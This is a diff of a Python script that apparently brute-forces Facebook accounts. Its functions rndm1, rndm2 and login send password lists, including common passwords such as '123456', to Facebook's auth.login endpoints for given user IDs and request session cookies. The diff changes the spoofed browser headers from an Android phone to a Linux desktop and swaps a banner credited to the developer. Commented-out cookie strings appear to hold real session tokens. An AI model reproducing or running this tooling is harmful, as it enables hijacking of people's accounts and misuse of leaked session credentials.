@@ -369,14 +369,11 @@ def linex():
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 logo =""" 
-\033[1;93m┏━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-\033[1;93m┃\033[1;32m     __   \033[1;93m┃
-\033[1;93m┃ \033[1;31m   /   \   \033[1;93m┃
-\033[1;93m┃\033[1;32m   /  ^  \   \033[1;93m┃
-\033[1;93m┃\033[1;33m  /  /_\  \  \033[1;93m┃
-\033[1;93m┃\033[1;32m /  _____  \ \033[1;93m┃
-\033[1;93m┃\033[1;36m/__/     \__\ \033[1;93m┃
-\033[1;93m┗━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+██    ███  █████  ███████ ██  █████      
+████  ████ ██   ██ ██      ██ ██   ██     
+██ ████ ██ ███████ █████   ██ ███████     
+██  ██  ██ ██   ██ ██      ██ ██   ██     
+██      ██ ██   ██ ██      ██ ██   ██     
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m DEVELOPER   :  Khosti
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m FACEBOOK    :  Mafia Rayess
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m WHATSAPP     :  93783361438
@@ -1065,26 +1062,26 @@ def rndm1(uid,passlist):
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                         }
                         headers = {
-    'authority': 'm.facebook.com',
+    'authority': 'www.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; locale=en_US; m_pixel_ratio=3.43505597114563; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712338010; x-referer=eyJyIjoiL3NldHRpbmdzL2VtYWlsLyIsImgiOiIvc2V0dGluZ3MvZW1haWwvP19fd2JsdD0xIiwicyI6Im0ifQ%3D%3D; wd=315x578; fr=1KBJ9oOPgo4cePG8z.AWUJoi2xRsUuxYa8TnRmZEAi_XM.BmBq2I..AAA.0.0.BmEDSk.AWXXMF2EuE8',
+    # 'cookie': 'datr=wIAUZkfNZci5jRYJIygKSgKM; sb=wIAUZkUmq2yI1hEMHk_9KhiX; ps_l=0; ps_n=0; locale=en_US; wl_cbv=v2%3Bclient_version%3A2462%3Btimestamp%3A1712640548; vpd=v1%3B578x314x3.43505597114563; dpr=3.7835533618927; wd=712x1308; oo=v1',
     'dpr': '2.75',
-    'referer': 'https://www.facebook.com/',
+    'referer': 'https://www.facebook.com/?stype=lo&deoia=1&jlou=Afc_4WjdSpzeuUwV13nOtjOr_ZMnDJvUXM50HXL1XXvbYSeJNukS0qLPfxWGM_KxnhjkOiu6kviPIXErm2506dE33JekbvbLGS90Px-jefurYQ&smuh=27905&lh=Ac-x2hlNUWD8pGTFmyc',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Mi Note 10 Lite"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-site',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
                         url = 'https://b-graph.facebook.com/auth/login'
@@ -1173,13 +1170,13 @@ def rndm2(uid,passlist):
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                         }
                         headers = {
-    'authority': 'm.facebook.com',
+    'authority': 'www.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; wl_cbv=v2%3Bclient_version%3A2445%3Btimestamp%3A1711116599; dpr=3.7835533618927; m_pixel_ratio=3.7835533618927; fr=1KBJ9oOPgo4cePG8z.AWXQeJzbr3qCWN_yBYrIdgK_Gis.BmBq2I..AAA.0.0.BmDTo4.AWWIk2UNWXo; c_user=100009233728221; xs=7%3ASljUj6vnuax2ig%3A2%3A1712142905%3A-1%3A4597; m_page_voice=100009233728221; wd=712x1308',
+    # 'cookie': 'datr=wIAUZkfNZci5jRYJIygKSgKM; sb=wIAUZkUmq2yI1hEMHk_9KhiX; ps_l=0; ps_n=0; locale=en_US; wl_cbv=v2%3Bclient_version%3A2462%3Btimestamp%3A1712640548; vpd=v1%3B578x314x3.43505597114563; dpr=3.7835533618927; wd=712x1308; oo=v1',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/login/save-device/?login_source=login',
+    'referer': 'https://www.facebook.com/?stype=lo&deoia=1&jlou=Afc_4WjdSpzeuUwV13nOtjOr_ZMnDJvUXM50HXL1XXvbYSeJNukS0qLPfxWGM_KxnhjkOiu6kviPIXErm2506dE33JekbvbLGS90Px-jefurYQ&smuh=27905&lh=Ac-x2hlNUWD8pGTFmyc',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
@@ -1335,26 +1332,26 @@ def login(uid):
         sys.stdout.flush()
         for pw in ["123456","123456789","1234567","123456789","123123","112233"]:
             headers = {
-    'authority': 'm.facebook.com',
+    'authority': 'www.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; locale=en_US; m_pixel_ratio=3.43505597114563; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712338010; x-referer=eyJyIjoiL3NldHRpbmdzL2VtYWlsLyIsImgiOiIvc2V0dGluZ3MvZW1haWwvP19fd2JsdD0xIiwicyI6Im0ifQ%3D%3D; wd=315x578; fr=1KBJ9oOPgo4cePG8z.AWUJoi2xRsUuxYa8TnRmZEAi_XM.BmBq2I..AAA.0.0.BmEDSk.AWXXMF2EuE8',
+    # 'cookie': 'datr=wIAUZkfNZci5jRYJIygKSgKM; sb=wIAUZkUmq2yI1hEMHk_9KhiX; ps_l=0; ps_n=0; locale=en_US; wl_cbv=v2%3Bclient_version%3A2462%3Btimestamp%3A1712640548; vpd=v1%3B578x314x3.43505597114563; dpr=3.7835533618927; wd=712x1308; oo=v1',
     'dpr': '2.75',
-    'referer': 'https://www.facebook.com/',
+    'referer': 'https://www.facebook.com/?stype=lo&deoia=1&jlou=Afc_4WjdSpzeuUwV13nOtjOr_ZMnDJvUXM50HXL1XXvbYSeJNukS0qLPfxWGM_KxnhjkOiu6kviPIXErm2506dE33JekbvbLGS90Px-jefurYQ&smuh=27905&lh=Ac-x2hlNUWD8pGTFmyc',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Mi Note 10 Lite"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-site',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'viewport-width': '980',
 }
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
